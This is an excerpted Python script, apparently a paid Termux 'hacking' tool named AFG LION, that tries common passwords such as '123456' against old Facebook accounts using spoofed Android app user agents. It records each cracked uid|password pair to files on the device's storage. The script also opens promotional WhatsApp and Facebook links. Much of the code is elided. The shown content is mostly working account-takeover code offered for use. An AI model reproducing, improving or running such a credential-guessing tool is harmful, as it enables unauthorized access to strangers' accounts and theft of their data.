...
try:
    ...
    os.system("clear")
    print(f"{style} {green}AFG LION TOOL IS NOT ALLOW WITHOUT STORAGE PERMISSION");os.system('termux-setup-storage');os.system('clear');exit(f"{green} RUN AGAIN 👉 python old.py")
#▬▭▬▭▬▭▬▭[SECURITY BOX]▬▭▬▭▬▭▬▭#
...
os.system("git pull");os.system("xdg-open https://chat.whatsapp.com/HMbdSe1zbiuDl1FZ4CJsz7");time.sleep(2);os.system("clear")
#▬▭▬▭▬▭▬▭[MODULE]▬▭▬▭▬▭▬▭#
try:import pystyle
...
╠═╣╠╣ ║ ╦  ║  ║║ ║║║║
╩ ╩╚  ╚═╝  ╩═╝╩╚═╝╝╚╝"""" MR-LION"))
info=(f"""{style}{green} FACEBOOK {white}➤ {green} Hacking Helper
{style}{green} STATUS   {white}➤ {green}PAID
{style}{green} GITHUB   {white}➤ {green}afglion5""")
def main_logo():
...
def main():
    ...
    if year_select in ['A','a','01','1']:os.system("xdg-open https://www.facebook.com/profile.php?id=100001020534057&mibextid=ZbWKwL");old_2011_2014()
    elif year_select in ['B','b','02','2']:os.system("xdg-open https://chat.whatsapp.com/HMbdSe1zbiuDl1FZ4CJsz7");old_2009_2010()
    elif year_select in ['c','C','03','3']:os.system("xdg-open https://www.facebook.com/groups/1694231751353488/?ref=share&mibextid=NSMWBT");main()
    elif year_select in ['6','f','06','F']:os.system("xdg-open https://www.facebook.com/profile.php?id=100001020534057&mibextid=ZbWKwL");old_2008()
    elif year_select in ['O','o','00','0']:os.system("xdg-open https://chat.whatsapp.com/HMbdSe1zbiuDl1FZ4CJsz7");os.system("exit")
    else:main()
#▬▭▬▭▬▭▬▭[OLD MENU]▬▭▬▭▬▭▬▭#
def old_2011_2014():
    user=[]
...
def _method_A_(uid,user):
    ...
    agent = tarek_ua()
    try:
        sys.stdout.write(f'\r\r{rad}[{green}LION-M1{rad}]{white}~{rad}[\x1b[1;97m{loop}{rad}]{white}~{rad}[{green1}CREAKED{white}•{green}{len(oks)}{rad}]');sys.stdout.flush()       
...
'Content-Length': '2126'}
            ...
            if "session_key" in mtd_A:
                ...
                open("/sdcard/AFG-LION-OLD-M1--OK.txt","a").write(uid+"|"+pw+"\n")
                break 
...
def _method_B_(uid,user):
    ...
    ua=f"Dalvik/2.1.0 (Linux; Android 8.0.0; RNE-L21 Build/HUAWEIRNE-L21) FBAN/Orca-Android;FBAV/221.1.0.15.157;FBPN/com.facebook.orca;FBLC/en_US;FBBV/160677542;FBCR/Ooredoo;FBMF/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1020,height=2040};FB_FW/;] FBBK/1]'"
    try:
        ...
        for pw in ["123456","1234567","12345678","123456789","123123"]:
            ...
            if "session_key" in mtd_B:
                oks.append(uid)
                print(f"\r\r{red}[{green1}SUCCESS{red}] {green}{uid} {red}»{green} {pw}")
                open("/sdcard/AFG-LION-OLD-M2-OK.txt","a").write(uid+"|"+pw+"\n")
                break 
